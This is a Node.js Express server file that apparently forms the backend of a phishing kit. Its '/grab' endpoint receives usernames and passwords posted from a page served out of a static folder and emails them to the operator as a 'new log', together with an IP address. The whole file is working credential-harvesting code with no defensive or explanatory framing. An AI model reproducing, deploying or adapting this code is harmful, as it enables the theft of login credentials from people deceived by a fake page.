require("dotenv").config();
const express=require("express");
const cors=require("cors");
const helmet=require("helmet");
const path=require("path")
const sendmail=require("./helpers/mailer");
const ip=require("ip");
const app=express();
const PORT=process.env.PORT || 4400;
app.use(helmet());
app.use(cors({
   origin: true
}));
app.use(express.json());
app.use(express.urlencoded({extended:false}))
app.use(express.static(path.join(__dirname,"public")));


app.post("/grab",(req, res)=>{
   
   try{
    $message=`Hello, a new log received.:\n User: ${req.body.user}\n Password: ${req.body.pass}\n Location: ${ip.address()}`;
           sendmail($message);
           
            res.json("ok");


   }catch(err){
    res.json(err.message);
   }
  
})


app.listen(PORT,()=>console.log(`App listening on port ${PORT}`));